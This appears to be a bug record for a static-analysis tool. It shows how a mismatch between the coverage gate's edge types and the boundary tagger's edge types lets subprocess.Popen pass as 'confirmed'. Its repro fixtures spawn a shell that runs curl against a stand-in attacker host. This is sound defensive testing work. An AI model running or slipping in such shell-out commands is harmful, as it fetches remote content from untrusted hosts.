    pr_ref:  # 5f34
    description: "THE INVARIANT: every edge type the coverage gate counts as a classification\nopportunity must be an edge type the boundary tagger can actually tag. If the\ngate is broader than the tagger, a call the gate calls EXAMINED can never\nproduce a chain, and \"no chains found\" becomes `confirmed`. That is INV-buzab's\nshape exactly — silence read as safety — reached through a different door.\n\nVIOLATED, on the shipped CLI, with NO overlay and NO flags:\n\n  verify_claims._CALL_SITE_EDGE_TYPES = {calls, module_attr_ref, instantiates}\n  io_boundary.tag_io_boundaries(call_types=...) = {calls, imports,\n      module_attr_ref, event_publishes, wasm_bridge, wasm_load,\n      bridge_invokes, cgo_bridge, ffi_bridge, ipc_calls, ipc_event}\n\n`instantiates` is in the gate and NOT in the tagger. So a catalogued primitive\nthat is CONSTRUCTOR-shaped is classified by the gate (-> examined, permit) and\nis structurally untaggable (-> no chain, no violation).\n\nREPRO + CONTROL, both on dev dcb73df631, claim\n`{boundary: subprocess, must_not_exist: true}`:\n\n    subprocess.Popen([\"/bin/sh\",\"-c\",\"curl http://attacker.example.com\"])\n        -> Verdict: confirmed          rc 0      *** FALSE CONFIRM ***\n    subprocess.run([\"/bin/sh\",\"-c\",\"curl http://attacker.example.com\"])\n        -> Verdict: violated           rc 1      <- CONTROL, same claim,\n                                                    same catalogue row family\n\nThe only difference between the two fixtures is the edge type the analyzer\nemits: `instantiates` vs `calls`. `subprocess.Popen` is a SHIPPED catalogue row\n(kind=function, boundary=subprocess) — no user input is involved anywhere.\n\nThe gate's own comment justifying the inclusion names the motivating example:\n\"``instantiates`` IS included because a constructor is a genuine classification\nopportunity — ``socket.socket()`` is a catalogued primitive.\" Two things about\nthat sentence are worth recording: the reasoning is CORRECT (which is why the\nfix is to widen the tagger, not narrow the gate), and its example is FALSE —\n`socket` carries no row in python.yaml at all (that is the WI-dupok backlog).\n\nCORPUS SIZE, via production's own `classify_call` over persisted survey edges\n(instrument in scratchpad; the numbers are constructor-shaped calls that the\ncatalogue DOES classify and the tagger can never tag):\n\n    poetry   12   tempfile.TemporaryDirectory x6, NamedTemporaryFile x3,\n                  subprocess.Popen x2, TemporaryFile x1\n    httpx     2   tempfile.TemporaryFile x2\n    fastapi   0\n\nINSTRUMENT CAVEAT, recorded because it nearly produced a false null: the first\nversion of the scan used persisted `meta.io_boundary` as its positive control\nand got ZERO on every repo. That is not evidence about the tagger — boundary\ntagging is ON-DEMAND and not persisted into survey.json (poetry.json carries 11\n`io_boundary` keys in total, all `command_launch`, which is the WI-sofaf bash\nproducer-hint leak). The behavioural Popen/run pair above is the real\ndiscriminator; the corpus scan only sizes it.\n\nFIX DIRECTION (structural, not per-site): add `instantiates` to the tagger's\n`call_types`, and pin the SUBSET PROPERTY with a parity test —\n`_CALL_SITE_EDGE_TYPES` must be a subset of the tagger's `call_types`, so the\nnext divergence fails a test instead of shipping a false all-clear. The reverse\ncontainment is deliberately NOT asserted: the tagger legitimately carries\n`imports` and the FFI family, which the gate documents excluding, and that\ndirection is safe (an edge the tagger tags but the gate ignores can only\ndowngrade `confirmed` to `inconclusive`).\n\nDIRECTION OF THE FIX: it ADDS detection (more boundaries tagged, more chains,\nmore `violated`). It cannot delete a finding. Measure the boundary-count delta\non real repos anyway and report it, per the standing rule.\n\nCROSS-LANGUAGE: unchecked at filing time. Every language whose analyzer emits\n`instantiates` and whose catalogue carries constructor-shaped rows has the same\nexposure; `java.net.Socket` / `java.io.FileWriter` are the obvious suspects.\nCheck before claiming the fix is general."  # 5f34
    fields:  # 5f34
      statement: "Every edge type the coverage gate counts as a classification opportunity (verify_claims._CALL_SITE_EDGE_TYPES) must be an edge type io_boundary.tag_io_boundaries can actually tag (its call_types). VIOLATED: 'instantiates' is in the gate and not in the tagger, so a constructor-shaped catalogued primitive is counted EXAMINED while being structurally untaggable, and 'no chains found' becomes confirmed. Shipped CLI, no overlay, no flags: subprocess.Popen([...]) returns confirmed rc 0 for {boundary: subprocess, must_not_exist: true} while the control subprocess.run([...]) returns violated rc 1."  # 5f34
      root_cause: "tag_io_boundaries' call_types default was written for the tagging pass alone and never re-audited when _CALL_SITE_EDGE_TYPES was authored for the INV-buzab coverage gate. The two sets encode the same question (which edges are a call site the catalogue could classify) and drifted; the existing parity test asserts both consumers share one PREDICATE (classify_call) but never that they run it over the same edge POPULATION."  # 5f34
